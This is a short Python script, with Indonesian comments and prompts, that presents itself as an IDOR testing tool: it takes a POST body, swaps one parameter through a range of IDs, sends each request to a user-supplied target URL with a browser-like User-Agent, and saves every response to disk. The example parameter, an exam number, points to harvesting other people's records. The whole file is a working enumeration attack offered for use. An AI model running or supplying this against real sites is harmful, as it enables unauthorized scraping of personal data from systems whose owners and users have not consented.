import requests
from urllib.parse import parse_qs
import os

def main():
    print("=== IDOR POST Testing Tool ===")

    # Step 1: Ambil input POST body
    raw_post = input("[?] Masukkan isi POST body (contoh: noujian=2529450101&SUBMIT=CARI): ").strip()
    parsed_params = parse_qs(raw_post)

    print("\n[+] Parameter ditemukan:")
    for param in parsed_params:
        print(f" - {param}")

    # Step 2: Pilih parameter yang mau diubah
    target_param = input("\n[?] Parameter mana yang ingin kamu uji? >> ").strip()

    # Step 3: Input nilai bruteforce
    start_id = int(input("[?] Masukkan nilai awal ID: "))
    end_id = int(input("[?] Masukkan nilai akhir ID: "))
    url = input("[?] Masukkan URL target (contoh: https://target.site/path): ").strip()

    # Step 4: Set headers standar
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Step 5: Buat folder simpan hasil
    if not os.path.exists("hasil_respon"):
        os.mkdir("hasil_respon")

    print("\n[*] Mulai kirim request...\n")

    # Step 6: Kirim request dari ID awal sampai akhir
    for i in range(start_id, end_id + 1):
        post_data = parsed_params.copy()
        post_data[target_param] = [str(i)]

        # Encode data ke format x-www-form-urlencoded
        encoded_data = "&".join([f"{k}={v[0]}" for k, v in post_data.items()])

        try:
            response = requests.post(url, data=encoded_data, headers=headers, timeout=10)
            length = len(response.text)
            status = response.status_code

            print(f"[+] ID {i} | Status: {status} | Length: {length}")

            # Simpan respon ke file
            filename = f"hasil_respon/hasil_{i}.html"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(response.text)

        except Exception as e:
            print(f"[!] Gagal kirim ID {i}: {e}")

    print("\n[✓] Selesai. Semua hasil disimpan di folder 'hasil_respon'.")

if __name__ == "__main__":
    main()